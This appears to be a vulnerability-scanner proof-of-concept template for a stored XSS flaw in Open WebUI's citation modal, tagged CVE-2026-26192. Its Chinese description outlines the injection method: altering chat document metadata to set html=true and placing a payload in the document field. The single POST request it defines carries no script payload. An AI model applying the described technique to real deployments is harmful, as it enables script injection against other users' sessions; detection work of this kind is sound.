[info]
author = "ave"
description = "通过篡改聊天历史中的文档元数据，设置 html=true 并在 document 字段中注入 XSS payload，使前端 CitationModal 组件将恶意内容渲染为 iFrame，实现存储型跨站脚本攻击。需先创建含文件附件的聊天，然后通过 POST 请求修改聊天记录注入 payload。"
id = "POC-AVE-2026-0049"
name = "Open WebUI Stored XSS via iFrame in Citations Model PoC"
severity = "high"
tags = [
    "cve-2026-26192",
    "xss",
    "stored-xss",
    "open-webui",
]
vuln_id = [
    "CVE-2026-26192",
    "AVE-2026-0049",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/api/chats/{{chat_id}}"
protocol = "http"

[poc.requests.body]
content = '{"chat":{"history":{"messages":{"msg1":{"id":"msg1","role":"assistant","content":"","model":"","parentId":null,"children":[],"done":true},"msg2":{"id":"msg2","role":"user","content":"test","parentId":"msg1","children":[]}},"currentId":"msg2"},"models":[],"messages":[{"id":"msg1","role":"assistant","content":"","model":"","parentId":null,"children":[],"done":true},{"id":"msg2","role":"user","content":"test","parentId":"msg1","children":[]}]},"meta":{},"title":"XSS Test"}'
type = "json"

[poc.requests.headers]
Authorization = "Bearer {{token}}"
Content-Type = "application/json"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["success"]
